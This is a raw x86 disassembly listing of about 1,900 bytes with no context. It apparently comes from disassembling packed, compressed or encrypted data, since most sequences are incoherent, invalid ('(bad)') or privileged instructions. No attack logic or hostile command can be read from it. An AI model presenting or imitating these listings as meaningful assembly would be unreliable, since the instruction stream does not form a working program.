  41a746:	mov    edi,0xa9b996a3
  41a74b:	ins    BYTE PTR es:[edi],dx
  41a74c:	jmp    0xaec4c663
  41a751:	test   BYTE PTR [ebx],dl
  41a753:	sub    DWORD PTR [esi+0x6488611],esp
  41a759:	loopne 0x41a784
  41a75b:	pop    esi
  41a75c:	xchg   BYTE PTR [edx],cl
  41a75e:	retf   
  41a75f:	add    edi,DWORD PTR [edx-0x69ad4433]
  41a765:	out    dx,al
  41a766:	stos   BYTE PTR es:[edi],al
  41a767:	mov    ebx,0x9f4bb55
  41a76c:	lahf   
  41a76d:	adc    eax,0x60fb5bd1
  41a772:	mov    esi,0x412c061c
  41a777:	in     eax,dx
  41a778:	(bad)  
  41a779:	xchg   ecx,eax
  41a77a:	push   es
  41a77b:	sbb    eax,0xad2c4a6a
  41a780:	fbld   TBYTE PTR [ebx+0x0]
  41a783:	mov    ecx,0xd819455a
  41a788:	cwde   
  41a789:	jae    0x41a7c2
  41a78b:	mov    eax,ds:0x811d569b
  41a790:	(bad)  
  41a791:	adc    ebx,0x14
  41a794:	jecxz  0x41a79f
  41a796:	enter  0xcfb4,0x35
  41a79a:	pop    ebx
  41a79b:	sub    al,0x1d
  41a79d:	(bad)  
  41a79f:	cwde   
  41a7a0:	das    
  41a7a1:	or     eax,0xf706b03e
  41a7a6:	mov    DWORD PTR [ecx+0x76],edi
  41a7a9:	popf   
  41a7aa:	lods   al,BYTE PTR ds:[esi]
  41a7ab:	leave  
  41a7ac:	sti    
  41a7ad:	retf   
  41a7ae:	push   esi
  41a7af:	jecxz  0x41a78c
  41a7b1:	sub    ah,BYTE PTR [eax]
  41a7b3:	dec    ebx
  41a7b4:	call   0xdbb5:0xc0ebf5e
  41a7bb:	sub    ebp,DWORD PTR [edi-0x4b]
  41a7be:	fmul   st(2),st
  41a7c0:	stc    
  41a7c1:	ret    0xe81a
  41a7c4:	outs   dx,DWORD PTR ds:[esi]
  41a7c5:	iret   
  41a7c6:	xor    al,al
  41a7c8:	sbb    BYTE PTR [edi-0x366168],bl
  41a7ce:	mov    WORD PTR [edx+0x4b],?
  41a7d1:	pop    esp
  41a7d2:	pop    edi
  41a7d3:	push   ebx
  41a7d4:	int3   
  41a7d5:	dec    ecx
  41a7d6:	in     al,0xfb
  41a7d8:	ret    0x7fd5
  41a7db:	add    eax,0x12ee1839
  41a7e0:	xor    ebp,edx
  41a7e2:	popa   
  41a7e3:	mov    ds:0x25ef40f9,al
  41a7e8:	pusha  
  41a7e9:	push   0xffffff89
  41a7eb:	call   0x36ae5ee5
  41a7f0:	push   edi
  41a7f1:	in     al,dx
  41a7f2:	dec    edi
  41a7f3:	sbb    ebp,DWORD PTR [ebx]
  41a7f5:	pushf  
  41a7f6:	or     DWORD PTR [edi+0x9],0xffffff99
  41a7fa:	popf   
  41a7fb:	sbb    edi,DWORD PTR [ebp-0x66]
  41a7fe:	mov    ecx,0xc2349b7e
  41a803:	xchg   ecx,edx
  41a805:	push   ebp
  41a806:	outs   dx,DWORD PTR ds:[esi]
  41a807:	mov    eax,0x631de502
  41a80c:	enter  0x3785,0x76
  41a810:	adc    al,0x29
  41a812:	ins    BYTE PTR es:[edi],dx
  41a813:	popa   
  41a814:	sti    
  41a815:	and    bh,BYTE PTR [edi+0x6d]
  41a818:	jns    0x41a805
  41a81a:	fisub  WORD PTR [esi]
  41a81c:	xchg   esp,eax
  41a81d:	in     eax,0xdf
  41a81f:	fistp  DWORD PTR [edx+0x5e4de11e]
  41a825:	jl     0x41a869
  41a827:	push   eax
  41a828:	fwait
  41a829:	and    BYTE PTR [ebp+ecx*8-0x8cb1d96],ch
  41a830:	in     eax,dx
  41a831:	xor    ah,BYTE PTR [ecx+0x39]
  41a834:	push   cs
  41a835:	mov    ah,BYTE PTR [edi]
  41a837:	push   es
  41a838:	sub    al,0xf
  41a83a:	adc    ebp,DWORD PTR [ecx+0x7e]
  41a83d:	add    ecx,DWORD PTR [edi+0x7053eb8c]
  41a843:	pop    esi
  41a844:	jb     0x41a84e
  41a846:	(bad)  
  41a847:	fdivp  st(5),st
  41a849:	iret   
  41a84a:	dec    ecx
  41a84b:	ss push edi
  41a84d:	repz add eax,DWORD PTR ds:0xfa531390
  41a854:	or     eax,esi
  41a856:	bound  ebx,QWORD PTR [esi]
  41a858:	sbb    eax,0x6e6ddbe5
  41a85d:	jg     0x41a861
  41a85f:	pop    eax
  41a860:	jae    0x41a899
  41a862:	jmp    0x41a8a5
  41a864:	jns    0x41a85f
  41a866:	leave  
  41a867:	jp     0x41a850
  41a869:	out    0xae,al
  41a86b:	mov    ds:0x5eaa68b1,eax
  41a870:	in     al,dx
  41a871:	shl    DWORD PTR [eax-0x44d0214a],cl
  41a877:	xchg   esp,esp
  41a879:	mov    ds:0x3ff74b96,al
  41a87e:	cdq    
  41a87f:	cmp    DWORD PTR [ebx+0x7ea29780],esi
  41a885:	jmp    0x41a8ce
  41a887:	push   ecx
  41a888:	(bad)  
  41a889:	xchg   esi,eax
  41a88a:	cmp    DWORD PTR [edx+0x6fdb30b1],esp
  41a890:	sub    DWORD PTR [edi+0x7a4ffa8e],eax
  41a896:	ja     0x41a851
  41a898:	and    ecx,DWORD PTR [edx+0x566e3a51]
  41a89e:	fisubr WORD PTR [ecx-0x1e9423aa]
  41a8a4:	add    BYTE PTR [eax+0x57743772],0xb
  41a8ab:	retf   0x90e2
  41a8ae:	sti    
  41a8af:	cmp    al,0x2d
  41a8b1:	xchg   edx,eax
  41a8b2:	fcomp  DWORD PTR [esi+ebp*2]
  41a8b5:	push   ds
  41a8b6:	mov    dl,0xe3
  41a8b8:	push   edx
  41a8b9:	or     al,0x9
  41a8bb:	jg     0x41a88a
  41a8bd:	sahf   
  41a8be:	push   cs
  41a8bf:	sbb    al,0xd5
  41a8c1:	push   0x28fee1fb
  41a8c6:	cmp    al,0x85
  41a8c8:	std    
  41a8c9:	icebp  
  41a8ca:	dec    eax
  41a8cb:	out    dx,eax
  41a8cc:	call   0x2004f53c
  41a8d1:	arpl   WORD PTR ds:0x4d111926,sp
  41a8d7:	fs aas 
  41a8d9:	jne    0x41a924
  41a8db:	mov    cl,0xf2
  41a8dd:	data16 fdivr st(0),st
  41a8e0:	mov    ds,cx
  41a8e3:	mov    cl,0x85
  41a8e5:	in     eax,dx
  41a8e6:	sahf   
  41a8e7:	inc    ebp
  41a8e8:	jae    0x41a88e
  41a8ea:	mov    al,ds:0xeb0bfd9c
  41a8f0:	mov    DWORD PTR [edi],ebp
  41a8f2:	(bad)  
  41a8f4:	(bad)  
  41a8f5:	leave  
  41a8f6:	leave  
  41a8f7:	mov    eax,ds:0xdf52b202
  41a8fc:	test   eax,0xbb8a8bd4
  41a901:	mov    eax,DWORD PTR [edi-0x3b]
  41a904:	sbb    al,0x6d
  41a906:	cmp    al,0xb9
  41a908:	pusha  
  41a909:	lock das 
  41a90b:	jl     0x41a987
  41a90d:	test   al,0x32
  41a90f:	test   al,0xaf
  41a911:	mov    ds:0x49253404,al
  41a916:	mov    WORD PTR [edx+eax*4],cs
  41a919:	(bad)  
  41a91a:	in     al,0x25
  41a91c:	hlt    
  41a91d:	pop    esi
  41a91e:	jmp    0x2c74a626
  41a923:	ja     0x41a91f
  41a925:	mov    al,0xcf
  41a927:	jmp    0x82a:0x65b7bc96
  41a92e:	push   0x1944e554
  41a933:	out    0x97,al
  41a935:	sti    
  41a936:	mov    eax,0x20c48d4d
  41a93b:	add    al,0x52
  41a93d:	add    DWORD PTR [ecx+ecx*2+0x3b],ebp
  41a941:	imul   edx,DWORD PTR [ebp-0x4cd3e936],0xfbd4439b
  41a94b:	pop    ecx
  41a94c:	and    eax,0x5c0745d
  41a951:	jecxz  0x41a990
  41a953:	lods   eax,DWORD PTR ds:[esi]
  41a954:	js     0x41a9b9
  41a956:	mov    ah,0xcf
  41a958:	add    al,0xff
  41a95a:	retf   0x5b2f
  41a95d:	sti    
  41a95e:	inc    ecx
  41a95f:	pop    ss
  41a960:	mov    BYTE PTR [edx+ebp*2],al
  41a963:	in     eax,dx
  41a964:	inc    esi
  41a965:	adc    eax,0x1469dbb
  41a96a:	adc    al,BYTE PTR [esi]
  41a96c:	(bad)  
  41a96d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a96e:	adc    BYTE PTR [ecx+0x4d484d18],bh
  41a974:	cmp    al,BYTE PTR [ebp+eax*1-0x38cee5e7]
  41a97b:	xlat   BYTE PTR ds:[ebx]
  41a97c:	adc    edi,DWORD PTR [edi+edx*1-0x54]
  41a980:	(bad)  
  41a981:	mov    dl,0x7
  41a983:	inc    eax
  41a984:	sub    al,0x1a
  41a986:	repnz inc ecx
  41a988:	mov    dh,0x68
  41a98a:	cld    
  41a98b:	retf   
  41a98c:	mov    esp,0x1774e233
  41a991:	shr    DWORD PTR [esp+ecx*4-0x21],1
  41a995:	cmp    DWORD PTR [esi+0x5b],edx
  41a998:	fisttp DWORD PTR [edx-0x18826ed0]
  41a99e:	pop    edi
  41a99f:	mov    esp,0xa4d6cfc7
  41a9a4:	(bad)  
  41a9a5:	neg    eax
  41a9a7:	pop    esi
  41a9a8:	xor    al,0x2b
  41a9aa:	leave  
  41a9ab:	je     0x41a995
  41a9ad:	dec    eax
  41a9ae:	hlt    
  41a9af:	add    dl,BYTE PTR [ecx-0x3dd6bd0f]
  41a9b5:	aaa    
  41a9b6:	push   es
  41a9b7:	cmp    eax,DWORD PTR ds:0x8f9b6f65
  41a9bd:	imul   eax,edi,0xb286d087
  41a9c3:	ja     0x41a9d7
  41a9c5:	inc    esp
  41a9c6:	idiv   BYTE PTR [ebp+edi*8-0x2e]
  41a9ca:	rcl    ecx,1
  41a9cc:	dec    eax
  41a9cd:	xchg   esp,eax
  41a9ce:	lods   eax,DWORD PTR ds:[esi]
  41a9cf:	shl    BYTE PTR [edx],0xad
  41a9d2:	jp     0x41aa4c
  41a9d4:	rcr    BYTE PTR [ebx-0x14],0x75
  41a9d8:	fild   WORD PTR [edi]
  41a9da:	out    0xfc,al
  41a9dc:	aaa    
  41a9dd:	inc    edx
  41a9de:	xor    al,0xe0
  41a9e0:	cld    
  41a9e1:	jecxz  0x41a9e2
  41a9e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9e4:	imul   esi,DWORD PTR [ebx+eax*4],0xc4be2783
  41a9eb:	loopne 0x41a976
  41a9ed:	xchg   ebx,eax
  41a9ee:	test   DWORD PTR ds:0x7ad7f170,0xd2ba300d
  41a9f8:	mov    bl,0xc5
  41a9fa:	push   esi
  41a9fb:	cs sbb edx,edx
  41a9fe:	repnz push ebp
  41aa00:	jmp    0x41a9cf
  41aa02:	test   BYTE PTR [ecx],cl
  41aa04:	jne    0x41a9aa
  41aa06:	addr16 cmp cl,dl
  41aa09:	sub    DWORD PTR [ecx+0x6a],ebp
  41aa0c:	xor    BYTE PTR [ebp-0x30],0x8
  41aa10:	xor    eax,0xf303ad75
  41aa15:	and    edi,DWORD PTR [edi-0x40]
  41aa18:	lds    edx,FWORD PTR [ecx-0x6d7cf024]
  41aa1e:	adc    bl,ch
  41aa20:	pop    edi
  41aa21:	mov    cl,0xba
  41aa23:	mov    ds:0x577eb130,eax
  41aa28:	lea    ecx,[esi]
  41aa2a:	xor    eax,0xf19da97d
  41aa2f:	xchg   edx,eax
  41aa30:	ins    DWORD PTR es:[edi],dx
  41aa31:	cdq    
  41aa32:	push   eax
  41aa33:	pop    esp
  41aa34:	pushf  
  41aa35:	rcl    DWORD PTR [ebx+0x2a],1
  41aa38:	adc    DWORD PTR [esi],0xd96ff880
  41aa3e:	adc    ebx,DWORD PTR [edi+0x5f18821]
  41aa44:	shl    DWORD PTR [ecx+0x6c5630f7],1
  41aa4a:	add    edi,DWORD PTR [edi]
  41aa4c:	adc    dh,al
  41aa4e:	mov    edi,0xb8095cf
  41aa53:	repz mov cl,0x4d
  41aa56:	push   cs
  41aa57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa58:	xor    BYTE PTR [ebx],dl
  41aa5a:	out    dx,eax
  41aa5b:	push   0x4561459b
  41aa60:	adc    BYTE PTR [edi+0x6],0x4e
  41aa64:	mov    ecx,DWORD PTR [edi]
  41aa66:	push   ebx
  41aa67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa68:	jg     0x41aa48
  41aa6a:	test   eax,esp
  41aa6c:	pop    esp
  41aa6d:	hlt    
  41aa6e:	imul   esp,DWORD PTR [edx-0x5a3da7b0],0x3d
  41aa75:	pop    esp
  41aa76:	add    ebp,DWORD PTR [edx]
  41aa78:	not    BYTE PTR [ecx+0x30]
  41aa7b:	jno    0x41aa83
  41aa7d:	mov    al,ds:0xe8243927
  41aa82:	sub    cl,bh
  41aa84:	jns    0x41aac8
  41aa86:	sub    DWORD PTR [ebp-0x334c58c5],ebx
  41aa8c:	daa    
  41aa8d:	fldcw  WORD PTR [edx+0x1b6e1907]
  41aa93:	add    DWORD PTR [ecx],esp
  41aa95:	(bad)  
  41aa96:	mov    ebp,0x89e0ee9d
  41aa9b:	mov    gs,WORD PTR [eax+0x66]
  41aa9e:	xchg   edi,eax
  41aa9f:	stos   DWORD PTR es:[edi],eax
  41aaa0:	(bad)  
  41aaa1:	jg     0x41aaf0
  41aaa3:	mov    esp,0x1d01f667
  41aaa8:	jg     0x41aa7f
  41aaaa:	push   esi
  41aaab:	mov    cl,0xb7
  41aaad:	jg     0x41aa9c
  41aaaf:	into   
  41aab0:	xchg   BYTE PTR [edi-0x6f674c8c],dl
  41aab6:	pop    eax
  41aab7:	mov    ebp,0x23e9b4cc
  41aabc:	push   esi
  41aabd:	dec    ebp
  41aabe:	aad    0x6a
  41aac0:	xor    dh,BYTE PTR [esi-0x6c]
  41aac3:	(bad)  
  41aac4:	call   0xf12e92cc
  41aac9:	scas   eax,DWORD PTR es:[edi]
  41aaca:	inc    ebp
  41aacb:	(bad)  [esi-0x6c]
  41aace:	js     0x41ab36
  41aad0:	push   ebx
  41aad1:	sti    
  41aad2:	ret    0x931c
  41aad5:	mov    al,0xe3
  41aad7:	daa    
  41aad8:	ret    0x2a4b
  41aadb:	xor    BYTE PTR [ecx+0x1ea99de1],ch
  41aae1:	adc    DWORD PTR [edi+ebx*8-0x6f],esp
  41aae5:	sbb    BYTE PTR gs:[esi+0x0],bh
  41aae9:	mov    ds:0x7ac9cd5e,eax
  41aaee:	outs   dx,DWORD PTR ds:[esi]
  41aaef:	dec    ecx
  41aaf0:	xchg   esp,eax
  41aaf1:	adc    BYTE PTR [ebp+0x26ac2899],0xe8
  41aaf8:	outs   dx,DWORD PTR fs:[esi]
  41aafa:	and    eax,0xaa991e68
  41aaff:	xor    edx,DWORD PTR cs:[edx-0x58]
  41ab03:	lods   eax,DWORD PTR ds:[esi]
  41ab04:	scas   eax,DWORD PTR es:[edi]
  41ab05:	repz add ax,0x3237
  41ab0a:	inc    ebp
  41ab0b:	sbb    cl,BYTE PTR [esi]
  41ab0d:	mov    ebp,0xad5fdc87
  41ab12:	fnop   
  41ab14:	outs   dx,BYTE PTR ds:[esi]
  41ab15:	clc    
  41ab16:	mov    bl,0x4a
  41ab18:	outs   dx,DWORD PTR ds:[esi]
  41ab19:	adc    edi,eax
  41ab1b:	(bad)  
  41ab1c:	(bad)  
  41ab1d:	xor    DWORD PTR [esi-0x28],ebx
  41ab20:	and    al,dh
  41ab22:	push   0xd1f9663e
  41ab27:	jns    0x41ab54
  41ab29:	mov    al,0x51
  41ab2b:	add    esp,DWORD PTR [eax-0x47]
  41ab2e:	inc    ebx
  41ab2f:	dec    BYTE PTR [esi-0x3ca7766b]
  41ab35:	dec    eax
  41ab36:	in     al,dx
  41ab37:	push   es
  41ab38:	xchg   ebx,eax
  41ab39:	push   esp
  41ab3a:	cmp    dh,BYTE PTR [edi+0x2880bdf2]
  41ab40:	add    al,0x13
  41ab42:	pop    esp
  41ab43:	stc    
  41ab44:	push   ebx
  41ab45:	imul   ebx,DWORD PTR [edx],0xffffffeb
  41ab48:	inc    ebp
  41ab49:	mov    edx,0x766030a
  41ab4e:	mov    eax,ds:0xa3fd7698
  41ab53:	mov    dh,0xff
  41ab55:	ds stc 
  41ab57:	lea    esi,[ecx+ebx*8+0x29]
  41ab5b:	hlt    
  41ab5c:	push   esp
  41ab5d:	rcr    BYTE PTR [ebp-0x5],0x93
  41ab61:	test   al,0x0
  41ab63:	out    dx,al
  41ab64:	push   edi
  41ab65:	mov    bh,0x2d
  41ab67:	inc    ebx
  41ab68:	xor    eax,0xaf30f005
  41ab6d:	xor    ch,dh
  41ab6f:	rcl    esp,1
  41ab71:	rol    BYTE PTR [edi],0xe0
  41ab74:	nop
  41ab75:	aad    0xaa
  41ab77:	mov    WORD PTR [eax+0x5b],cs
  41ab7a:	inc    esp
  41ab7b:	mov    edi,0xb3d9afec
  41ab80:	test   BYTE PTR [edx],bh
  41ab82:	add    DWORD PTR [ebx-0x47],edi
  41ab85:	mov    bl,0xf7
  41ab87:	(bad)  
  41ab88:	in     eax,dx
  41ab89:	jle    0x41abd0
  41ab8b:	imul   esi,DWORD PTR ds:0x751314f3,0x60dca432
  41ab95:	fild   WORD PTR [eax+0x45]
  41ab98:	es js  0x41ab8b
  41ab9b:	mov    al,ds:0x478616b3
  41aba0:	out    0x18,al
  41aba2:	mov    al,0xde
  41aba4:	push   ebx
  41aba5:	imul   edx,DWORD PTR fs:[esi-0x4e],0x95f9ac54
  41abad:	mov    ebx,0xee470159
  41abb2:	add    edi,DWORD PTR [ebp+0x15fac7dc]
  41abb8:	mov    dh,0x23
  41abba:	dec    esi
  41abbb:	std    
  41abbc:	pop    ecx
  41abbd:	push   esi
  41abbe:	sbb    ebx,ebx
  41abc0:	scas   al,BYTE PTR es:[edi]
  41abc1:	pop    ds
  41abc2:	loop   0x41ab9e
  41abc4:	jge    0x41ab5d
  41abc6:	jne    0x41ac2a
  41abc8:	addr16 xor eax,0x656f0475
  41abce:	cdq    
  41abcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abd0:	jae    0x41abc3
  41abd2:	popf   
  41abd3:	push   eax
  41abd4:	cmp    ch,BYTE PTR es:[eax-0x41c1462c]
  41abdb:	sbb    ebx,DWORD PTR [ebp-0x6b]
  41abde:	sti    
  41abdf:	loopne 0x41abd2
  41abe1:	add    BYTE PTR [edi+eax*4+0x34],ch
  41abe5:	mov    esi,DWORD PTR [esi-0x7e4be803]
  41abeb:	push   0x71
  41abed:	fbld   TBYTE PTR [eax+0x2a468ed8]
  41abf3:	shr    BYTE PTR ds:0x8ccc822d,cl
  41abf9:	pop    edi
  41abfa:	jb     0x41ac54
  41abfc:	bound  edi,QWORD PTR [ebp+0x54]
  41abff:	push   ds
  41ac00:	loop   0x41ab9c
  41ac02:	add    BYTE PTR [edi],bh
  41ac04:	xor    DWORD PTR [ebp-0x2c],ebx
  41ac07:	lds    esp,FWORD PTR [ebx-0x70]
  41ac0a:	pop    DWORD PTR [esi+0x31]
  41ac0d:	setg   dl
  41ac10:	popa   
  41ac11:	in     eax,dx
  41ac12:	add    al,0x20
  41ac14:	pop    edx
  41ac15:	aaa    
  41ac16:	mov    eax,DWORD PTR [edi+0xc]
  41ac19:	adc    al,0x3b
  41ac1b:	jnp    0x41ac60
  41ac1d:	mov    esp,DWORD PTR [edi+edx*8]
  41ac20:	fldenv [ebp-0xe6736f1]
  41ac26:	sub    cl,cl
  41ac28:	jnp    0x41abcf
  41ac2a:	sub    BYTE PTR [edx+esi*2-0x6a],dh
  41ac2e:	retf   
  41ac2f:	xchg   BYTE PTR [ebp+0x4d83f14a],al
  41ac35:	mov    cl,0x11
  41ac37:	cld    
  41ac38:	dec    ebx
  41ac39:	daa    
  41ac3a:	cmp    al,0xf6
  41ac3c:	loope  0x41ac69
  41ac3e:	ins    BYTE PTR es:[edi],dx
  41ac3f:	iret   
  41ac40:	mov    dl,0x9e
  41ac42:	cmp    BYTE PTR [edi-0x1d],cl
  41ac45:	or     al,0xce
  41ac47:	leave  
  41ac48:	adc    BYTE PTR [esi+0x2b],bl
  41ac4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac4c:	and    ebx,DWORD PTR [eax-0x5b901dc8]
  41ac52:	mov    edi,0x2cf25e61
  41ac57:	pop    eax
  41ac58:	sbb    BYTE PTR [ecx-0x4c],cl
  41ac5b:	and    ecx,eax
  41ac5d:	xchg   ecx,eax
  41ac5e:	in     al,0x8b
  41ac60:	stos   BYTE PTR es:[di],al
  41ac62:	adc    esp,DWORD PTR [ebx]
  41ac64:	ret    
  41ac65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac66:	mov    al,0x82
  41ac68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac69:	fimul  WORD PTR [eax]
  41ac6b:	add    DWORD PTR [ecx-0x21],edi
  41ac6e:	scas   al,BYTE PTR es:[edi]
  41ac6f:	leave  
  41ac70:	and    BYTE PTR [ebx-0x56dbdbe7],0x6a
  41ac77:	arpl   WORD PTR [eax],bp
  41ac79:	push   ecx
  41ac7a:	push   esp
  41ac7b:	adc    edx,esi
  41ac7d:	test   DWORD PTR [esi+0x1711c7a9],edi
  41ac83:	lods   eax,DWORD PTR ds:[esi]
  41ac84:	loop   0x41acdc
  41ac86:	lods   al,BYTE PTR ds:[esi]
  41ac87:	iret   
  41ac88:	push   esp
  41ac89:	mov    edi,0x4c15a8dd
  41ac8e:	(bad)  
  41ac8f:	ss dec edx
  41ac91:	mov    ds:0x53ad0f38,al
  41ac96:	in     al,dx
  41ac97:	jecxz  0x41acb8
  41ac99:	pop    ebp
  41ac9a:	cdq    
  41ac9b:	and    edx,edx
  41ac9d:	push   ecx
  41ac9e:	je     0x41ace3
  41aca0:	push   edi
  41aca1:	add    DWORD PTR [edi-0x76ad9f61],ebx
  41aca7:	adc    DWORD PTR [ebp+0x71],0xffffffa4
  41acab:	inc    ecx
  41acac:	add    esp,DWORD PTR [eax-0x12]
  41acaf:	inc    esi
  41acb0:	out    0x86,eax
  41acb2:	mov    BYTE PTR [eax],dl
  41acb4:	cmp    al,0x7e
  41acb6:	in     al,dx
  41acb7:	inc    edi
  41acb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acb9:	imul   edi,edx,0x8636cd36
  41acbf:	loop   0x41acfe
  41acc1:	push   0x675695ac
  41acc6:	inc    edi
  41acc7:	mov    eax,ds:0x8e5c4c7e
  41accc:	pusha  
  41accd:	jmp    0x41ac64
  41accf:	and    cl,BYTE PTR [edi+0x78d61451]
  41acd5:	ret    0xf3c2
  41acd8:	push   esp
  41acd9:	push   eax
  41acda:	cmp    al,0x59
  41acdc:	leave  
  41acdd:	pop    ebx
  41acde:	nop
  41acdf:	sar    DWORD PTR [edx-0x7],0xb4
  41ace3:	repz or eax,0x869ac221
  41ace9:	mov    bh,0x98
  41aceb:	xchg   esi,eax
  41acec:	cmp    eax,ebx
  41acee:	add    BYTE PTR [edx+edx*2-0x7b1f673a],dl
  41acf5:	push   esp
  41acf6:	xor    eax,0x5d5f7017
  41acfb:	pop    ebp
  41acfc:	jl     0x41ad07
  41acfe:	cmp    bh,BYTE PTR ds:0xb8f91272
  41ad04:	xor    ch,dh
  41ad06:	mov    ebx,0x5a1e0227
  41ad0b:	out    0x21,eax
  41ad0d:	sti    
  41ad0e:	add    eax,0x66b7c8a0
  41ad13:	nop
  41ad14:	and    bl,BYTE PTR [ebx+0x12]
  41ad17:	pushf  
  41ad18:	xor    BYTE PTR [edx-0x2f],bh
  41ad1b:	xor    esp,DWORD PTR [edx+0x24]
  41ad1e:	stos   DWORD PTR es:[edi],eax
  41ad1f:	bound  ebp,QWORD PTR [esi+0x1aa25e20]
  41ad25:	jmp    0x41ad01
  41ad27:	clc    
  41ad28:	jmp    0xa344:0x4e01272e
  41ad2f:	pushf  
  41ad30:	or     al,0xa3
  41ad32:	cdq    
  41ad33:	inc    ebp
  41ad34:	cs xchg ecx,eax
  41ad36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad37:	ja     0x41acf1
  41ad39:	push   0xd8805303
  41ad3e:	dec    ebp
  41ad3f:	push   esp
  41ad40:	mov    edi,DWORD PTR ds:0x49601f7
  41ad46:	mov    eax,ds:0x8519950a
  41ad4b:	in     al,0x15
  41ad4d:	or     BYTE PTR [ecx-0x7],ch
  41ad50:	jg     0x41ad05
  41ad52:	enter  0x5160,0xb9
  41ad56:	popf   
  41ad57:	fld    DWORD PTR [esi-0x6b]
  41ad5a:	push   edx
  41ad5b:	jno    0x41ad38
  41ad5d:	xchg   ecx,eax
  41ad5e:	push   ss
  41ad5f:	or     al,0x31
  41ad61:	test   BYTE PTR ds:0x204ed9b,al
  41ad67:	fwait
  41ad68:	sub    eax,0x971a16eb
  41ad6d:	xor    DWORD PTR [ebx+0x7f752a6c],ebp
  41ad73:	gs stos BYTE PTR es:[edi],al
  41ad75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad76:	test   BYTE PTR [edx+ecx*4-0x1d4884c5],bl
  41ad7d:	mov    edi,edx
  41ad7f:	retf   0x8ba2
  41ad82:	push   esp
  41ad83:	xlat   BYTE PTR ds:[ebx]
  41ad84:	mov    ebp,0x6c13649b
  41ad89:	les    eax,FWORD PTR [ebx]
  41ad8b:	mov    DWORD PTR [edx-0x4d],edi
  41ad8e:	jl     0x41ad88
  41ad90:	sub    al,0x2e
  41ad92:	jmp    0x41ad3d
  41ad94:	xlat   BYTE PTR ds:[ebx]
  41ad95:	or     BYTE PTR [ebx+0x25a15ff8],0x61
  41ad9c:	adc    eax,0x8694f311
  41ada1:	call   0x67d9:0x41ed7ec
  41ada8:	jno    0x41ae26
  41adaa:	pop    esi
  41adab:	gs pushf 
  41adad:	push   ebp
  41adae:	mov    ecx,0x490c059c
  41adb3:	lds    edx,FWORD PTR [ecx-0x19]
  41adb6:	sar    BYTE PTR [eax*1-0x5edc5cc9],0x1f
  41adbe:	mov    esp,0xd37053ce
  41adc3:	push   es
  41adc4:	iret   
  41adc5:	xor    al,0xd1
  41adc7:	adc    al,0x35
  41adc9:	pop    esp
  41adca:	mov    al,ds:0x321ad223
  41adcf:	inc    esi
  41add0:	push   es
  41add1:	and    eax,0xbc541576
  41add6:	das    
  41add7:	mov    ds:0x8a65004d,eax
  41addc:	cs mov bh,0x3b
  41addf:	pandn  mm1,QWORD PTR [eax]
  41ade2:	xchg   ebp,eax
  41ade3:	into   
  41ade4:	inc    ecx
  41ade5:	cmp    DWORD PTR ds:0xe0d26cdc,eax
  41adeb:	and    DWORD PTR [ebx-0x193db00f],esi
  41adf1:	fnstcw WORD PTR [edx-0x40]
  41adf4:	mov    cl,0x7b
  41adf6:	inc    DWORD PTR [edi-0x1ecf3ec7]
  41adfc:	mov    ebx,ds
  41adfe:	jae    0x41ae23
  41ae00:	jae    0x41ae0e
  41ae02:	into   
  41ae03:	or     dh,BYTE PTR [ebp+0x3db578dd]
  41ae09:	sub    al,0xdc
  41ae0b:	mov    ds:0x8f4cfbd1,al
  41ae10:	test   al,cl
  41ae12:	ret    0x9393
  41ae15:	pop    ss
  41ae16:	mov    ds,WORD PTR [eax]
  41ae18:	dec    dx
  41ae1a:	push   ebx
  41ae1b:	adc    esp,ebx
  41ae1d:	jo     0x41ae82
  41ae1f:	xor    DWORD PTR [ebx+0x7],edx
  41ae22:	sti    
  41ae23:	push   ebp
  41ae24:	cmc    
  41ae25:	sbb    al,0xe7
  41ae27:	iret   
  41ae28:	(bad)  
  41ae29:	xor    bx,WORD PTR [ecx]
  41ae2c:	(bad)  
  41ae2d:	cwde   
  41ae2e:	in     eax,dx
  41ae2f:	mov    esi,0x84b7c988
  41ae34:	cwde   
  41ae35:	xchg   ebx,eax
  41ae37:	not    BYTE PTR [edi]
  41ae39:	add    DWORD PTR [ecx+0x257fe7ee],ebx
  41ae3f:	pop    edi
  41ae40:	(bad)  
  41ae41:	jmp    0x41ae8c
  41ae43:	sbb    al,0xbf
  41ae45:	in     eax,dx
  41ae46:	and    BYTE PTR [ecx],cl
  41ae48:	repz pushfw 
  41ae4b:	les    eax,FWORD PTR [edx]
  41ae4d:	imul   ebp,edi,0x7fb1cfac
  41ae53:	lock add al,0xe9
  41ae56:	xlat   BYTE PTR ds:[ebx]
  41ae57:	xor    DWORD PTR [ecx-0x2f],edi
  41ae5a:	(bad)  
  41ae5c:	fs ins DWORD PTR es:[edi],dx
  41ae5e:	sub    BYTE PTR ds:0x97285492,0x58
  41ae65:	dec    eax
  41ae66:	out    0x24,al
  41ae68:	mov    al,ds:0x300d439a
  41ae6d:	cld    
  41ae6e:	lods   al,BYTE PTR ds:[esi]
  41ae6f:	cdq    
  41ae70:	sub    eax,0x37da3051
  41ae75:	push   0x48367804
  41ae7a:	scas   al,BYTE PTR es:[edi]
  41ae7b:	push   esi
  41ae7c:	push   ecx
  41ae7d:	jb     0x41aebd
  41ae7f:	and    bl,0x5f
  41ae82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae83:	pop    ds
  41ae84:	js     0x41ae3f
  41ae86:	jg     0x41ae17
  41ae88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae89:	jecxz  0x41ae17
  41ae8b:	repz pop ebx
  41ae8d:	retf   0x7d13
  41ae90:	cwde   
  41ae91:	call   FWORD PTR [ecx-0x51ccd212]
  41ae97:	or     BYTE PTR [ebx],ch
  41ae99:	rol    eax,cl
  41ae9b:	sti    
  41ae9c:	(bad)  
  41ae9d:	push   ebx
  41ae9e:	daa    
  41ae9f:	mov    ebp,0x9aaf5f0d
  41aea4:	dec    ecx
  41aea5:	add    BYTE PTR [ebx],0x37
  41aea8:	nop
